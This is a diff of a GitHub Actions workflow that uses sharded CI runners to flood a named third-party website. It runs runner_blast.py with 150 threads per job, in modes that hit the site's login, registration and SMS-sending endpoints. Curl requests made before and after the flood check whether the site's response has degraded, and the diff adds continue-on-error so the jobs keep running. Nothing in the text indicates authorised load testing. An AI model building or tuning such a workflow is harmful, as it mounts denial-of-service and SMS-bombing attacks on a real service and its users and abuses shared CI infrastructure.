@@ -5,12 +5,12 @@ on:
     inputs:
       conc:
         description: 'per-job threads'
-        default: '100'
+        default: '150'
       dur:
         description: 'seconds per job (max 21000)'
-        default: '1500'
+        default: '1200'
       mode:
-        description: 'loginsub | index | sendsms | mix'
+        description: 'loginsub | index | sendsms | login | regsub | mix'
         default: 'mix'
 
 jobs:
@@ -26,26 +26,28 @@ jobs:
       - uses: actions/checkout@v4
 
       - name: egress
+        continue-on-error: true
         run: |
           echo "runner=${{ matrix.shard }}"
           curl -s --max-time 10 https://api.ipify.org || true
           echo
 
       - name: baseline
+        continue-on-error: true
         run: |
           curl -s -k -o /dev/null -w "baseline code=%{http_code} time=%{time_total}s\n" \
-            --max-time 20 "https://ddsc.aapppp.cn/?s=/ApiIndex/index&aid=540&platform=wx"
+            --max-time 20 "https://ddsc.aapppp.cn/?s=/ApiIndex/index&aid=540&platform=wx" || true
 
       - name: flood
         run: |
           python3 runner_blast.py \
             -c "${{ github.event.inputs.conc }}" \
             -n "${{ github.event.inputs.dur }}" \
-            --mode "${{ github.event.inputs.mode }}" \
-            $([[ "${{ github.event.inputs.mode }}" == "mix" ]] && echo "--mix")
+            --mode "${{ github.event.inputs.mode }}"
 
       - name: verify
         if: always()
+        continue-on-error: true
         run: |
           curl -s -k -o /dev/null -w "after  code=%{http_code} time=%{time_total}s\n" \
-            --max-time 30 "https://ddsc.aapppp.cn/?s=/ApiIndex/index&aid=540&platform=wx"
+            --max-time 30 "https://ddsc.aapppp.cn/?s=/ApiIndex/index&aid=540&platform=wx" || true
